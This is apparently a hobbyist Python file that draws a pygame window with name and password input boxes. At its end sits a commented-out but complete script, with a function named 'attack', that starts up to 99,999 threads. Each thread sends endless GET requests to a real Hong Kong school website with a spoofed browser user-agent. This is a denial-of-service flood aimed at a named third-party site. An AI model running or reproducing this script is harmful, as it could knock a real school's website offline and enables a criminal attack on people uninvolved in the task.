import function_data.inputbox
import function_data.bgdata
if __name__ == '__main__':
    FPS = 60
    black = (74,74,74)
    screen_width = 1280
    screen_height = 720
    screen = function_data.bgdata.pygame.display.set_mode((screen_width, screen_height))
    function_data.bgdata.pygame.display.set_caption('input_box')
    name = function_data.inputbox.Intput_box(screen,600,500,'name')
    password = function_data.inputbox.Intput_box(screen,600,600,'password')

    while True:
        for event in function_data.bgdata.pygame.event.get():
            if event.type == function_data.bgdata.pygame.KEYDOWN and event.key == function_data.bgdata.pygame.K_ESCAPE:
                function_data.bgdata.ask_quetion('quit','do you want to quit right now?')
        screen.fill(black)
        name.draw()
        password.draw()
        name.interact(event)
        password.interact(event)
        function_data.bgdata.pygame.display.update()

# import threading
# import requests
# adsw = 'https://www.yy2.edu.hk/'
# data = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
#         }
# def attack(url,header):
#     while 1:
#         requests.get(url,headers=header)
#         print('1')
# def loop():
#     for i in range(99999):
#         haha = threading.Thread(target=attack,args=(adsw,data))
#         haha.start()
# loop()